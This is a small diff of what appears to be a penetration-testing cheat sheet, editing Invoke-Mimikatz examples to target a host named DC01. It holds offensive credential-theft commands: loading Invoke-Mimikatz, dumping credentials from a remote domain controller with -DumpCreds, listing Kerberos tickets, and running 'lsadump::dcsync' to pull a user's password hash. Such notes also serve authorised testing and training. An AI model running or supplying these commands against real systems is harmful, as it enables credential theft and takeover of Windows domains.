@@ -223,13 +223,13 @@ If functions not on remote host:-
 #### Invoke Mimikatz
 ```. ./Invoke-Mimikatz.ps1```
 
-```Invoke-Mimikatz -ComputerName```
+```Invoke-Mimikatz -ComputerName DC01```
 
-```Invoke-Mimikatz -ComputerName -DumpCreds```
+```Invoke-Mimikatz -ComputerName DC01 -DumpCreds```
 
 When invoking command make sure to wrap in double AND single quotes - 
 
-```Invoke-Mimikatz -ComputerName -Command "kerberos::list"```
+```Invoke-Mimikatz -ComputerName DC01 -Command "kerberos::list"```
 
 ```Invoke-Mimikatz -Command '"lsadump::dcsync /user:Bob"'```
 
